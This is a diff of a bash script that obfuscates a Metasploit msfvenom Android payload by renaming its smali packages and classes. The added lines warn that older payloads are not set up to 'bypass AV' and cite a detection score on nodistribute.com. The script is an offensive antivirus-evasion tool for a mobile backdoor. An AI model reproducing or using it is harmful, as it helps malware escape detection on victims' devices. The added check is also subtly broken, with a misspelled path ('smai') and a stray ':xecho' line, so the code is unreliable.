@@ -41,6 +41,14 @@ mv /tmp/payload/smali/com/metasploit /tmp/payload/smali/com/$VAR1
 mv /tmp/payload/smali/com/$VAR1/stage /tmp/payload/smali/com/$VAR1/$VAR2
 mv /tmp/payload/smali/com/$VAR1/$VAR2/Payload.smali /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
 
+#Exit the script if an older payload was generated
+if [ -f /tmp/payload/smai/com/$VAR1/$VAR2/PayloadTrustManager.smali ]; then
+    echo
+    echo -e "\033[31m An old version of the msfvenom generated payload was detected. Make sure you have everything compeltely updated in Kali! \n\n Older payloads have not been configured in this script to bypass AV. With that, this script still results in a 1/35 on nodistribute.com for the old payloads, but it is not recommended to continue. \x1B[0m"
+    :xecho
+    exit 1
+fi
+
 #Updating path in .smali files
 sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" /tmp/payload/smali/com/$VAR1/$VAR2/*
 sed -i "s#Payload#$VAR3#g" /tmp/payload/smali/com/$VAR1/$VAR2/*
